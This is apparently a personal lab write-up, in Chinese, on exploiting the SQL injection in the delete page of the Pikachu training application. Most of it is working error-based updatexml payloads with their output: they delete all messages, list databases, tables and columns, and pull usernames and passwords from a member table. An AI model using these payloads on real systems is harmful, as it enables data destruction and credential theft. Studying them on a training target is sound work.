# Pikachu SQL注入(delete)



* 原本想測一下是否有insert 注入後來看源碼，作者自定義了escape()函數，轉譯特殊符號

* 所以應該是要我們專心研究del 注入


### 刪除按鈕 a tag 的URL
```
http://pika/vul/sqli/sqli_del.php?id=56
```

### 猜測語句:
```
DELETE FROM message WHERE id = 56;

```



### 注入測試 (發現可以刪除全部留言) get 數字型

* 注意GET payload 不要有空格，全部用+ 或是 %20 帶替
```
http://pika/vul/sqli/sqli_del.php?id=0+or+1
```

或是
```
1+AND+updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null) 


XPATH syntax error: '~5.7.26~'
```




## 其他payload

```
找出所有數據庫
這我原本想用
1+AND+updatexml(rand(),concat(0x3a,(SELECT+concat(CHAR(126),schema_name,CHAR(126))+FROM+information_schema.schemata+LIMIT+0,1)),null)

//但是不知到哪裡出問題，沒有回顯，我改用下面的更方便

group_concat這種可以成功

1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(schema_name)+from+information_schema.schemata),1,30),0x7e),1)

//XPATH syntax error: '~information_schema,a_com__phpc~'


1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(schema_name)+from+information_schema.schemata),30,60),0x7e),1)

//XPATH syntax error: '~cmsv9,dvwa,my_db,mysql,performa'


1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(schema_name)+from+information_schema.schemata),60,90),0x7e),1)

//XPATH syntax error: '~ance_schema,phpcmsv9,phpcmsv912'


1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(schema_name)+from+information_schema.schemata),90,120),0x7e),1)

//XPATH syntax error: '~23123,pikachu,sys,test002,wp1~'


最後拼接起來就是所有數據庫，等等會解釋怎構造的
----------------------------------------------------------------------


1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema='pikachu'),1,30),0x7e),1)

但要注意，我們還得加上substr(x,1,30) 來控制輸出長度  表示輸出從1開始到30的字串

因為整個回顯最多只有30個字
至於30怎麼來的

1+AND+updatexml(1,concat(0x7e,substr(0123456789012345678901234567890123456789,1,30),0x7e),1)
XPATH syntax error: '~httpinfo,member,message,users,~'


可以用0123456789來循環幾次

我們最終輸出會類似 ~0123....~
萬一變成~0123456 (少了後面的~) 就代表超出了。
要一直減少到出現 ~123456789012345678901234567890~

去掉~123456789012345678901234567890 相當於31個字
我實測要再減1才能 ~xxx~ 


在節取30 -60的字串

1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema='pikachu'),30,60),0x7e),1)

XPATH syntax error: '~,xssblind~'


最後拼接起來就是pikachu數據庫所有的表
------------------------------------------------------------------------------------


member表所有欄位

1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name%3d'member'),1,30),0x7e),1)

XPATH syntax error: '~id,username,pw,sex,phonenum,ad~'

1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name%3d'member'),30,60),0x7e),1)

XPATH syntax error: '~ddress,email~'

最後拼接起來就是member表所有欄位
------------------------------------------------------------------------------------

帳號
1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(username)+from+member),1,30),0x7e),1)

密碼
1+AND+updatexml(1,concat(0x7e,substr((select+group_concat(pw)+from+member),1,30),0x7e),1)

自己慢慢爆破


------------------------------------------------------------------------------------
```
